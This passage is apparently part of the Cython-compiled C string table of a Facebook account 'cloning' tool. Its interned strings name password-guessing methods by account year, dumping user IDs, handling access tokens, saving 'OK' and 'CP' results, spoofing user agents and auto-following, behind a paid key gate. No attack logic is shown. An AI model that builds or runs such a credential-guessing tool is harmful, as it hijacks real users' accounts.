  {&__pyx_kp_s_2_1_92m_2008_to_2010_Random_Clo, __pyx_k_2_1_92m_2008_to_2010_Random_Clo, sizeof(__pyx_k_2_1_92m_2008_to_2010_Random_Clo), 0, 0, 1, 0},
  {&__pyx_kp_s_2_2008_to_2010_Random_Cloning_0, __pyx_k_2_2008_to_2010_Random_Cloning_0, sizeof(__pyx_k_2_2008_to_2010_Random_Cloning_0), 0, 0, 1, 0},
  {&__pyx_kp_s_2_Clone_All_in_one_Account, __pyx_k_2_Clone_All_in_one_Account, sizeof(__pyx_k_2_Clone_All_in_one_Account), 0, 0, 1, 0},
  {&__pyx_kp_s_2_Try_method_No_2_fast, __pyx_k_2_Try_method_No_2_fast, sizeof(__pyx_k_2_Try_method_No_2_fast), 0, 0, 1, 0},
  {&__pyx_kp_s_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 0, 1, 0},
  {&__pyx_n_s_33__3, __pyx_k_33__3, sizeof(__pyx_k_33__3), 0, 0, 1, 1},
  {&__pyx_n_s_33__33, __pyx_k_33__33, sizeof(__pyx_k_33__33), 0, 0, 1, 1},
  {&__pyx_kp_s_3_1_92m_2005_Random_Cloning_0_9, __pyx_k_3_1_92m_2005_Random_Cloning_0_9, sizeof(__pyx_k_3_1_92m_2005_Random_Cloning_0_9), 0, 0, 1, 0},
  {&__pyx_kp_s_3_2005_Random_Cloning_0_97m_B_a, __pyx_k_3_2005_Random_Cloning_0_97m_B_a, sizeof(__pyx_k_3_2005_Random_Cloning_0_97m_B_a), 0, 0, 1, 0},
  {&__pyx_kp_s_3_Clone_Using_File_Path, __pyx_k_3_Clone_Using_File_Path, sizeof(__pyx_k_3_Clone_Using_File_Path), 0, 0, 1, 0},
  {&__pyx_kp_s_3_Clone_using_file_path, __pyx_k_3_Clone_using_file_path, sizeof(__pyx_k_3_Clone_using_file_path), 0, 0, 1, 0},
  {&__pyx_kp_s_3_Try_method_No_3_fast, __pyx_k_3_Try_method_No_3_fast, sizeof(__pyx_k_3_Try_method_No_3_fast), 0, 0, 1, 0},
  {&__pyx_kp_s_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 0, 1, 0},
  {&__pyx_kp_s_4_1_92m_2004_Random_Cloning_0_9, __pyx_k_4_1_92m_2004_Random_Cloning_0_9, sizeof(__pyx_k_4_1_92m_2004_Random_Cloning_0_9), 0, 0, 1, 0},
  {&__pyx_kp_s_4_2004_Random_Cloning_0_97m_B_a, __pyx_k_4_2004_Random_Cloning_0_97m_B_a, sizeof(__pyx_k_4_2004_Random_Cloning_0_97m_B_a), 0, 0, 1, 0},
  {&__pyx_kp_s_5, __pyx_k_5, sizeof(__pyx_k_5), 0, 0, 1, 0},
  {&__pyx_kp_s_5_1_92m_File_Cloning_0_97m_Logi, __pyx_k_5_1_92m_File_Cloning_0_97m_Logi, sizeof(__pyx_k_5_1_92m_File_Cloning_0_97m_Logi), 0, 0, 1, 0},
  {&__pyx_kp_s_5_File_Cloning_0_37m_Login, __pyx_k_5_File_Cloning_0_37m_Login, sizeof(__pyx_k_5_File_Cloning_0_37m_Login), 0, 0, 1, 0},
  {&__pyx_kp_s_6, __pyx_k_6, sizeof(__pyx_k_6), 0, 0, 1, 0},
  {&__pyx_kp_s_6_1_92m_Upgrade_To_0_32mPremium, __pyx_k_6_1_92m_Upgrade_To_0_32mPremium, sizeof(__pyx_k_6_1_92m_Upgrade_To_0_32mPremium), 0, 0, 1, 0},
  {&__pyx_kp_s_786, __pyx_k_786, sizeof(__pyx_k_786), 0, 0, 1, 0},
  {&__pyx_n_s_April, __pyx_k_April, sizeof(__pyx_k_April), 0, 0, 1, 1},
  {&__pyx_n_s_August, __pyx_k_August, sizeof(__pyx_k_August), 0, 0, 1, 1},
  {&__pyx_n_s_BeautifulSoup, __pyx_k_BeautifulSoup, sizeof(__pyx_k_BeautifulSoup), 0, 0, 1, 1},
  {&__pyx_kp_s_Big_fan_brother, __pyx_k_Big_fan_brother, sizeof(__pyx_k_Big_fan_brother), 0, 0, 1, 0},
  {&__pyx_kp_s_Big_fan_sir, __pyx_k_Big_fan_sir, sizeof(__pyx_k_Big_fan_sir), 0, 0, 1, 0},
  {&__pyx_kp_s_CP_s_txt, __pyx_k_CP_s_txt, sizeof(__pyx_k_CP_s_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_Choose_Option, __pyx_k_Choose_Option, sizeof(__pyx_k_Choose_Option), 0, 0, 1, 0},
  {&__pyx_kp_s_Choose_Option_2, __pyx_k_Choose_Option_2, sizeof(__pyx_k_Choose_Option_2), 0, 0, 1, 0},
  {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
  {&__pyx_kp_s_Cp_result_saved_in_cp_txt, __pyx_k_Cp_result_saved_in_cp_txt, sizeof(__pyx_k_Cp_result_saved_in_cp_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_Cracking_finished, __pyx_k_Cracking_finished, sizeof(__pyx_k_Cracking_finished), 0, 0, 1, 0},
  {&__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4, __pyx_k_Dalvik_1_6_0_Linux_U_Android_4_4, sizeof(__pyx_k_Dalvik_1_6_0_Linux_U_Android_4_4), 0, 0, 1, 0},
  {&__pyx_n_s_December, __pyx_k_December, sizeof(__pyx_k_December), 0, 0, 1, 1},
  {&__pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W, __pyx_k_Dump_Failed_Maybe_The_User_Is_W, sizeof(__pyx_k_Dump_Failed_Maybe_The_User_Is_W), 0, 0, 1, 0},
  {&__pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W_2, __pyx_k_Dump_Failed_Maybe_The_User_Is_W_2, sizeof(__pyx_k_Dump_Failed_Maybe_The_User_Is_W_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Dump_failed_maybe_the_user_is_w, __pyx_k_Dump_failed_maybe_the_user_is_w, sizeof(__pyx_k_Dump_failed_maybe_the_user_is_w), 0, 0, 1, 0},
  {&__pyx_n_s_EAAA, __pyx_k_EAAA, sizeof(__pyx_k_EAAA), 0, 0, 1, 1},
  {&__pyx_n_s_EXCELLENT, __pyx_k_EXCELLENT, sizeof(__pyx_k_EXCELLENT), 0, 0, 1, 1},
  {&__pyx_kp_s_Enter_Password, __pyx_k_Enter_Password, sizeof(__pyx_k_Enter_Password), 0, 0, 1, 0},
  {&__pyx_kp_s_Enter_The_Number_Of_Ids, __pyx_k_Enter_The_Number_Of_Ids, sizeof(__pyx_k_Enter_The_Number_Of_Ids), 0, 0, 1, 0},
  {&__pyx_kp_s_Enter_User_ID, __pyx_k_Enter_User_ID, sizeof(__pyx_k_Enter_User_ID), 0, 0, 1, 0},
  {&__pyx_kp_s_Enter_password, __pyx_k_Enter_password, sizeof(__pyx_k_Enter_password), 0, 0, 1, 0},
  {&__pyx_kp_s_Enter_the_number_of_IDs, __pyx_k_Enter_the_number_of_IDs, sizeof(__pyx_k_Enter_the_number_of_IDs), 0, 0, 1, 0},
  {&__pyx_kp_s_Enter_your_file, __pyx_k_Enter_your_file, sizeof(__pyx_k_Enter_your_file), 0, 0, 1, 0},
  {&__pyx_kp_s_Expired_s, __pyx_k_Expired_s, sizeof(__pyx_k_Expired_s), 0, 0, 1, 0},
  {&__pyx_kp_s_Expired_tokens, __pyx_k_Expired_tokens, sizeof(__pyx_k_Expired_tokens), 0, 0, 1, 0},
  {&__pyx_kp_s_Extra_Dump_File_saved_in_s, __pyx_k_Extra_Dump_File_saved_in_s, sizeof(__pyx_k_Extra_Dump_File_saved_in_s), 0, 0, 1, 0},
  {&__pyx_kp_s_Extra_Dump_Files_Saved_In_s, __pyx_k_Extra_Dump_Files_Saved_In_s, sizeof(__pyx_k_Extra_Dump_Files_Saved_In_s), 0, 0, 1, 0},
  {&__pyx_kp_s_Extra_Dump_Files_saved_in_s, __pyx_k_Extra_Dump_Files_saved_in_s, sizeof(__pyx_k_Extra_Dump_Files_saved_in_s), 0, 0, 1, 0},
  {&__pyx_kp_s_Extra_File_saved_in_s, __pyx_k_Extra_File_saved_in_s, sizeof(__pyx_k_Extra_File_saved_in_s), 0, 0, 1, 0},
  {&__pyx_n_s_February, __pyx_k_February, sizeof(__pyx_k_February), 0, 0, 1, 1},
  {&__pyx_n_s_Fr__rr, __pyx_k_Fr__rr, sizeof(__pyx_k_Fr__rr), 0, 0, 1, 1},
  {&__pyx_n_s_Frr, __pyx_k_Frr, sizeof(__pyx_k_Frr), 0, 0, 1, 1},
  {&__pyx_n_s_Frrr, __pyx_k_Frrr, sizeof(__pyx_k_Frrr), 0, 0, 1, 1},
  {&__pyx_n_s_Host, __pyx_k_Host, sizeof(__pyx_k_Host), 0, 0, 1, 1},
  {&__pyx_kp_s_How_Much_Account_U_Want_Dump, __pyx_k_How_Much_Account_U_Want_Dump, sizeof(__pyx_k_How_Much_Account_U_Want_Dump), 0, 0, 1, 0},
  {&__pyx_kp_s_How_Much_Link_You_Want_Dump, __pyx_k_How_Much_Link_You_Want_Dump, sizeof(__pyx_k_How_Much_Link_You_Want_Dump), 0, 0, 1, 0},
  {&__pyx_kp_s_How_much_account_u_want_dump, __pyx_k_How_much_account_u_want_dump, sizeof(__pyx_k_How_much_account_u_want_dump), 0, 0, 1, 0},
  {&__pyx_kp_s_How_much_link_you_want_dump, __pyx_k_How_much_link_you_want_dump, sizeof(__pyx_k_How_much_link_you_want_dump), 0, 0, 1, 0},
  {&__pyx_kp_s_How_much_link_you_want_dump_2, __pyx_k_How_much_link_you_want_dump_2, sizeof(__pyx_k_How_much_link_you_want_dump_2), 0, 0, 1, 0},
  {&__pyx_n_s_IOError, __pyx_k_IOError, sizeof(__pyx_k_IOError), 0, 0, 1, 1},
  {&__pyx_kp_s_If_No_Result_Turn_On_Airplane_M, __pyx_k_If_No_Result_Turn_On_Airplane_M, sizeof(__pyx_k_If_No_Result_Turn_On_Airplane_M), 0, 0, 1, 0},
  {&__pyx_n_s_ImportError, __pyx_k_ImportError, sizeof(__pyx_k_ImportError), 0, 0, 1, 1},
  {&__pyx_n_s_James, __pyx_k_James, sizeof(__pyx_k_James), 0, 0, 1, 1},
  {&__pyx_kp_s_James_Boss, __pyx_k_James_Boss, sizeof(__pyx_k_James_Boss), 0, 0, 1, 0},
  {&__pyx_kp_s_James_Bro, __pyx_k_James_Bro, sizeof(__pyx_k_James_Bro), 0, 0, 1, 0},
  {&__pyx_n_s_James___1000, __pyx_k_James___1000, sizeof(__pyx_k_James___1000), 0, 0, 1, 1},
  {&__pyx_n_s_James___10000, __pyx_k_James___10000, sizeof(__pyx_k_James___10000), 0, 0, 1, 1},
  {&__pyx_n_s_James___10007, __pyx_k_James___10007, sizeof(__pyx_k_James___10007), 0, 0, 1, 1},
  {&__pyx_n_s_James___100__00, __pyx_k_James___100__00, sizeof(__pyx_k_James___100__00), 0, 0, 1, 1},
  {&__pyx_n_s_James___100__07, __pyx_k_James___100__07, sizeof(__pyx_k_James___100__07), 0, 0, 1, 1},
  {&__pyx_n_s_James___33__3, __pyx_k_James___33__3, sizeof(__pyx_k_James___33__3), 0, 0, 1, 1},
  {&__pyx_n_s_James___Fr__rr, __pyx_k_James___Fr__rr, sizeof(__pyx_k_James___Fr__rr), 0, 0, 1, 1},
  {&__pyx_n_s_James___Frr, __pyx_k_James___Frr, sizeof(__pyx_k_James___Frr), 0, 0, 1, 1},
  {&__pyx_n_s_James___Frrr, __pyx_k_James___Frrr, sizeof(__pyx_k_James___Frrr), 0, 0, 1, 1},
  {&__pyx_n_s_James___api, __pyx_k_James___api, sizeof(__pyx_k_James___api), 0, 0, 1, 1},
  {&__pyx_n_s_James___apii, __pyx_k_James___apii, sizeof(__pyx_k_James___apii), 0, 0, 1, 1},
  {&__pyx_n_s_James___bapi, __pyx_k_James___bapi, sizeof(__pyx_k_James___bapi), 0, 0, 1, 1},
  {&__pyx_n_s_James___bot__follow, __pyx_k_James___bot__follow, sizeof(__pyx_k_James___bot__follow), 0, 0, 1, 1},
  {&__pyx_n_s_James___f_james, __pyx_k_James___f_james, sizeof(__pyx_k_James___f_james), 0, 0, 1, 1},
  {&__pyx_n_s_James___fb, __pyx_k_James___fb, sizeof(__pyx_k_James___fb), 0, 0, 1, 1},
  {&__pyx_n_s_James___fb2, __pyx_k_James___fb2, sizeof(__pyx_k_James___fb2), 0, 0, 1, 1},
  {&__pyx_n_s_James___fb3, __pyx_k_James___fb3, sizeof(__pyx_k_James___fb3), 0, 0, 1, 1},
  {&__pyx_n_s_James___fb4, __pyx_k_James___fb4, sizeof(__pyx_k_James___fb4), 0, 0, 1, 1},
  {&__pyx_n_s_James___file, __pyx_k_James___file, sizeof(__pyx_k_James___file), 0, 0, 1, 1},
  {&__pyx_n_s_James___init, __pyx_k_James___init, sizeof(__pyx_k_James___init), 0, 0, 1, 1},
  {&__pyx_n_s_James___login, __pyx_k_James___login, sizeof(__pyx_k_James___login), 0, 0, 1, 1},
  {&__pyx_n_s_James___ma___sal2, __pyx_k_James___ma___sal2, sizeof(__pyx_k_James___ma___sal2), 0, 0, 1, 1},
  {&__pyx_n_s_James___ma__sal2, __pyx_k_James___ma__sal2, sizeof(__pyx_k_James___ma__sal2), 0, 0, 1, 1},
  {&__pyx_n_s_James___masal, __pyx_k_James___masal, sizeof(__pyx_k_James___masal), 0, 0, 1, 1},
  {&__pyx_n_s_James___masal2, __pyx_k_James___masal2, sizeof(__pyx_k_James___masal2), 0, 0, 1, 1},
  {&__pyx_n_s_James___me__nnn, __pyx_k_James___me__nnn, sizeof(__pyx_k_James___me__nnn), 0, 0, 1, 1},
  {&__pyx_n_s_James___menn, __pyx_k_James___menn, sizeof(__pyx_k_James___menn), 0, 0, 1, 1},
  {&__pyx_n_s_James___mennn, __pyx_k_James___mennn, sizeof(__pyx_k_James___mennn), 0, 0, 1, 1},
  {&__pyx_n_s_James___menu__file, __pyx_k_James___menu__file, sizeof(__pyx_k_James___menu__file), 0, 0, 1, 1},
  {&__pyx_n_s_James___method__1, __pyx_k_James___method__1, sizeof(__pyx_k_James___method__1), 0, 0, 1, 1},
  {&__pyx_n_s_James___method__2, __pyx_k_James___method__2, sizeof(__pyx_k_James___method__2), 0, 0, 1, 1},
  {&__pyx_n_s_James___request, __pyx_k_James___request, sizeof(__pyx_k_James___request), 0, 0, 1, 1},
  {&__pyx_n_s_James___start, __pyx_k_James___start, sizeof(__pyx_k_James___start), 0, 0, 1, 1},
  {&__pyx_n_s_James_main_coeg, __pyx_k_James_main_coeg, sizeof(__pyx_k_James_main_coeg), 0, 0, 1, 1},
  {&__pyx_n_s_January, __pyx_k_January, sizeof(__pyx_k_January), 0, 0, 1, 1},
  {&__pyx_n_s_July, __pyx_k_July, sizeof(__pyx_k_July), 0, 0, 1, 1},
  {&__pyx_n_s_June, __pyx_k_June, sizeof(__pyx_k_June), 0, 0, 1, 1},
  {&__pyx_n_s_KeyError, __pyx_k_KeyError, sizeof(__pyx_k_KeyError), 0, 0, 1, 1},
  {&__pyx_n_s_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 0, 1, 1},
  {&__pyx_kp_s_Love_it, __pyx_k_Love_it, sizeof(__pyx_k_Love_it), 0, 0, 1, 0},
  {&__pyx_kp_s_Love_you_sir, __pyx_k_Love_you_sir, sizeof(__pyx_k_Love_you_sir), 0, 0, 1, 0},
  {&__pyx_n_s_March, __pyx_k_March, sizeof(__pyx_k_March), 0, 0, 1, 1},
  {&__pyx_n_s_May, __pyx_k_May, sizeof(__pyx_k_May), 0, 0, 1, 1},
  {&__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi, __pyx_k_Mozilla_5_0_Linux_Android_10_Mi, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_10_Mi), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And, __pyx_k_Mozilla_5_0_Windows_IoT_10_0_And, sizeof(__pyx_k_Mozilla_5_0_Windows_IoT_10_0_And), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6, __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2, __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_2, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3, __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_3, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_3), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4, __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_4, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_4), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64, __pyx_k_Mozilla_5_0_Windows_NT_6_1_WOW64, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_6_1_WOW64), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64, __pyx_k_Mozilla_5_0_Windows_NT_6_1_Win64, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_6_1_Win64), 0, 0, 1, 0},
  {&__pyx_kp_s_No_internet_connection, __pyx_k_No_internet_connection, sizeof(__pyx_k_No_internet_connection), 0, 0, 1, 0},
  {&__pyx_n_s_November, __pyx_k_November, sizeof(__pyx_k_November), 0, 0, 1, 1},
  {&__pyx_n_s_OK, __pyx_k_OK, sizeof(__pyx_k_OK), 0, 0, 1, 1},
  {&__pyx_kp_s_OK_s_txt, __pyx_k_OK_s_txt, sizeof(__pyx_k_OK_s_txt), 0, 0, 1, 0},
  {&__pyx_n_s_October, __pyx_k_October, sizeof(__pyx_k_October), 0, 0, 1, 1},
  {&__pyx_kp_s_Password_Method_y_t, __pyx_k_Password_Method_y_t, sizeof(__pyx_k_Password_Method_y_t), 0, 0, 1, 0},
  {&__pyx_kp_s_Password_Minimum_6_Characters, __pyx_k_Password_Minimum_6_Characters, sizeof(__pyx_k_Password_Minimum_6_Characters), 0, 0, 1, 0},
  {&__pyx_kp_s_Password_Minimum_6_Characters_2, __pyx_k_Password_Minimum_6_Characters_2, sizeof(__pyx_k_Password_Minimum_6_Characters_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Password_method_y_t, __pyx_k_Password_method_y_t, sizeof(__pyx_k_Password_method_y_t), 0, 0, 1, 0},
  {&__pyx_kp_s_Password_method_y_t_2, __pyx_k_Password_method_y_t_2, sizeof(__pyx_k_Password_method_y_t_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Please_Dump_File_first_s, __pyx_k_Please_Dump_File_first_s, sizeof(__pyx_k_Please_Dump_File_first_s), 0, 0, 1, 0},
  {&__pyx_kp_s_Please_Dump_File_first_s_not_fo, __pyx_k_Please_Dump_File_first_s_not_fo, sizeof(__pyx_k_Please_Dump_File_first_s_not_fo), 0, 0, 1, 0},
  {&__pyx_n_s_Premium, __pyx_k_Premium, sizeof(__pyx_k_Premium), 0, 0, 1, 1},
  {&__pyx_kp_s_Return_menu, __pyx_k_Return_menu, sizeof(__pyx_k_Return_menu), 0, 0, 1, 0},
  {&__pyx_kp_s_Select_One, __pyx_k_Select_One, sizeof(__pyx_k_Select_One), 0, 0, 1, 0},
  {&__pyx_n_s_September, __pyx_k_September, sizeof(__pyx_k_September), 0, 0, 1, 1},
  {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
  {&__pyx_kp_s_Sir_big_fan_please_reply_me, __pyx_k_Sir_big_fan_please_reply_me, sizeof(__pyx_k_Sir_big_fan_please_reply_me), 0, 0, 1, 0},
  {&__pyx_kp_s_Sir_please_reply_me, __pyx_k_Sir_please_reply_me, sizeof(__pyx_k_Sir_please_reply_me), 0, 0, 1, 0},
  {&__pyx_kp_s_Sir_your_my_favorite_Developer, __pyx_k_Sir_your_my_favorite_Developer, sizeof(__pyx_k_Sir_your_my_favorite_Developer), 0, 0, 1, 0},
  {&__pyx_kp_s_Sorry_Your_Choice_Wrong, __pyx_k_Sorry_Your_Choice_Wrong, sizeof(__pyx_k_Sorry_Your_Choice_Wrong), 0, 0, 1, 0},
  {&__pyx_kp_s_Star, __pyx_k_Star, sizeof(__pyx_k_Star), 0, 0, 1, 0},
  {&__pyx_kp_s_Status_0_31mTrail_Free_1_0m, __pyx_k_Status_0_31mTrail_Free_1_0m, sizeof(__pyx_k_Status_0_31mTrail_Free_1_0m), 0, 0, 1, 0},
  {&__pyx_kp_s_Status_1_32mPrimium_0_97m, __pyx_k_Status_1_32mPrimium_0_97m, sizeof(__pyx_k_Status_1_32mPrimium_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_Successfully_deleted_token, __pyx_k_Successfully_deleted_token, sizeof(__pyx_k_Successfully_deleted_token), 0, 0, 1, 0},
  {&__pyx_kp_s_Super_Star, __pyx_k_Super_Star, sizeof(__pyx_k_Super_Star), 0, 0, 1, 0},
  {&__pyx_kp_s_Talk_To_Admin_For_Key, __pyx_k_Talk_To_Admin_For_Key, sizeof(__pyx_k_Talk_To_Admin_For_Key), 0, 0, 1, 0},
  {&__pyx_n_s_ThreadPoolExecutor, __pyx_k_ThreadPoolExecutor, sizeof(__pyx_k_ThreadPoolExecutor), 0, 0, 1, 1},
  {&__pyx_kp_s_Token_Invalid, __pyx_k_Token_Invalid, sizeof(__pyx_k_Token_Invalid), 0, 0, 1, 0},
  {&__pyx_kp_s_Token_invalid, __pyx_k_Token_invalid, sizeof(__pyx_k_Token_invalid), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_91m_s_0_0m, __pyx_k_Total_id_0_91m_s_0_0m, sizeof(__pyx_k_Total_id_0_91m_s_0_0m), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_91m_s_0_97m, __pyx_k_Total_id_0_91m_s_0_97m, sizeof(__pyx_k_Total_id_0_91m_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_91m_s_0_97m_2, __pyx_k_Total_id_0_91m_s_0_97m_2, sizeof(__pyx_k_Total_id_0_91m_s_0_97m_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_91m_s_0_97m_3, __pyx_k_Total_id_0_91m_s_0_97m_3, sizeof(__pyx_k_Total_id_0_91m_s_0_97m_3), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_91m_s_0_97m_4, __pyx_k_Total_id_0_91m_s_0_97m_4, sizeof(__pyx_k_Total_id_0_91m_s_0_97m_4), 0, 0, 1, 0},
  {&__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_k_Total_id_0_92m_s_0_97m, sizeof(__pyx_k_Total_id_0_92m_s_0_97m), 0, 0, 1, 0},
  {&__pyx_n_s_Trial, __pyx_k_Trial, sizeof(__pyx_k_Trial), 0, 0, 1, 1},
  {&__pyx_n_s_ValueError, __pyx_k_ValueError, sizeof(__pyx_k_ValueError), 0, 0, 1, 1},
  {&__pyx_kp_s_Warning_Check_link, __pyx_k_Warning_Check_link, sizeof(__pyx_k_Warning_Check_link), 0, 0, 1, 0},
  {&__pyx_kp_s_Wow_sir, __pyx_k_Wow_sir, sizeof(__pyx_k_Wow_sir), 0, 0, 1, 0},
  {&__pyx_kp_s_Wrong_Key_Bro, __pyx_k_Wrong_Key_Bro, sizeof(__pyx_k_Wrong_Key_Bro), 0, 0, 1, 0},
  {&__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi, __pyx_k_Your_Path_Wrong_Please_Check_Fi, sizeof(__pyx_k_Your_Path_Wrong_Please_Check_Fi), 0, 0, 1, 0},
  {&__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi_2, __pyx_k_Your_Path_Wrong_Please_Check_Fi_2, sizeof(__pyx_k_Your_Path_Wrong_Please_Check_Fi_2), 0, 0, 1, 0},
  {&__pyx_kp_s_Your_ip_s, __pyx_k_Your_ip_s, sizeof(__pyx_k_Your_ip_s), 0, 0, 1, 0},
  {&__pyx_n_s__112, __pyx_k__112, sizeof(__pyx_k__112), 0, 0, 1, 1},
  {&__pyx_kp_s__12, __pyx_k__12, sizeof(__pyx_k__12), 0, 0, 1, 0},
  {&__pyx_kp_s__28, __pyx_k__28, sizeof(__pyx_k__28), 0, 0, 1, 0},
  {&__pyx_kp_s__38, __pyx_k__38, sizeof(__pyx_k__38), 0, 0, 1, 0},
  {&__pyx_kp_s__39, __pyx_k__39, sizeof(__pyx_k__39), 0, 0, 1, 0},
  {&__pyx_kp_s__43, __pyx_k__43, sizeof(__pyx_k__43), 0, 0, 1, 0},
  {&__pyx_kp_s__55, __pyx_k__55, sizeof(__pyx_k__55), 0, 0, 1, 0},
  {&__pyx_kp_s__56, __pyx_k__56, sizeof(__pyx_k__56), 0, 0, 1, 0},
  {&__pyx_kp_s__68, __pyx_k__68, sizeof(__pyx_k__68), 0, 0, 1, 0},
  {&__pyx_n_s__97, __pyx_k__97, sizeof(__pyx_k__97), 0, 0, 1, 1},
  {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
  {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
  {&__pyx_kp_s_accept_encoding, __pyx_k_accept_encoding, sizeof(__pyx_k_accept_encoding), 0, 0, 1, 0},
  {&__pyx_kp_s_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 0, 1, 0},
  {&__pyx_kp_s_access_token, __pyx_k_access_token, sizeof(__pyx_k_access_token), 0, 0, 1, 0},
  {&__pyx_n_s_actor, __pyx_k_actor, sizeof(__pyx_k_actor), 0, 0, 1, 1},
  {&__pyx_kp_s_am_start_https_wa_me_96598064347, __pyx_k_am_start_https_wa_me_96598064347, sizeof(__pyx_k_am_start_https_wa_me_96598064347), 0, 0, 1, 0},
  {&__pyx_n_s_api, __pyx_k_api, sizeof(__pyx_k_api), 0, 0, 1, 1},
  {&__pyx_n_s_apii, __pyx_k_apii, sizeof(__pyx_k_apii), 0, 0, 1, 1},
  {&__pyx_n_s_apikey, __pyx_k_apikey, sizeof(__pyx_k_apikey), 0, 0, 1, 1},
  {&__pyx_kp_s_apikey___log, __pyx_k_apikey___log, sizeof(__pyx_k_apikey___log), 0, 0, 1, 0},
  {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
  {&__pyx_kp_s_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 0, 1, 0},
  {&__pyx_n_s_ask, __pyx_k_ask, sizeof(__pyx_k_ask), 0, 0, 1, 1},
  {&__pyx_n_s_b, __pyx_k_b, sizeof(__pyx_k_b), 0, 0, 1, 1},
  {&__pyx_n_s_bapi, __pyx_k_bapi, sizeof(__pyx_k_bapi), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_bl, __pyx_k_bl, sizeof(__pyx_k_bl), 0, 0, 1, 1},
  {&__pyx_n_s_bot__follow, __pyx_k_bot__follow, sizeof(__pyx_k_bot__follow), 0, 0, 1, 1},
  {&__pyx_n_s_bs4, __pyx_k_bs4, sizeof(__pyx_k_bs4), 0, 0, 1, 1},
  {&__pyx_n_s_bu, __pyx_k_bu, sizeof(__pyx_k_bu), 0, 0, 1, 1},
  {&__pyx_n_s_bulan, __pyx_k_bulan, sizeof(__pyx_k_bulan), 0, 0, 1, 1},
  {&__pyx_n_s_bulan_ttl, __pyx_k_bulan_ttl, sizeof(__pyx_k_bulan_ttl), 0, 0, 1, 1},
  {&__pyx_n_s_c_user, __pyx_k_c_user, sizeof(__pyx_k_c_user), 0, 0, 1, 1},
  {&__pyx_kp_s_cache_control, __pyx_k_cache_control, sizeof(__pyx_k_cache_control), 0, 0, 1, 0},
  {&__pyx_n_s_calendar, __pyx_k_calendar, sizeof(__pyx_k_calendar), 0, 0, 1, 1},
  {&__pyx_kp_s_cell_CTRadioAccessTechnologyHSDP, __pyx_k_cell_CTRadioAccessTechnologyHSDP, sizeof(__pyx_k_cell_CTRadioAccessTechnologyHSDP), 0, 0, 1, 0},
  {&__pyx_n_s_checkpoint, __pyx_k_checkpoint, sizeof(__pyx_k_checkpoint), 0, 0, 1, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_s_choose, __pyx_k_choose, sizeof(__pyx_k_choose), 0, 0, 1, 1},
  {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_s_coeg, __pyx_k_coeg, sizeof(__pyx_k_coeg), 0, 0, 1, 1},
  {&__pyx_n_s_comment, __pyx_k_comment, sizeof(__pyx_k_comment), 0, 0, 1, 1},
  {&__pyx_n_s_concurrent, __pyx_k_concurrent, sizeof(__pyx_k_concurrent), 0, 0, 1, 1},
  {&__pyx_n_s_concurrent_futures, __pyx_k_concurrent_futures, sizeof(__pyx_k_concurrent_futures), 0, 0, 1, 1},
